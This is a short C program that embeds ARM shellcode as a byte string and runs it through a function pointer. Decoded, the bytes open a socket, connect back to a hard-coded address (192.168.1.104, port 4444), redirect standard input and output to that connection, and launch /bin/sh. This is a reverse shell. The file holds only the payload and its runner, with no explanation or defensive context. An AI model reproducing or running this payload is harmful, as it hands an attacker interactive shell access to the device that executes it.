char code[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x92\x1a\x49\x1a\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\x01\x68\x2f\x62\x69\x6e\x2f\x73\x68\x58";

int main(int argc, char **argv) {
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
	return 1;
}
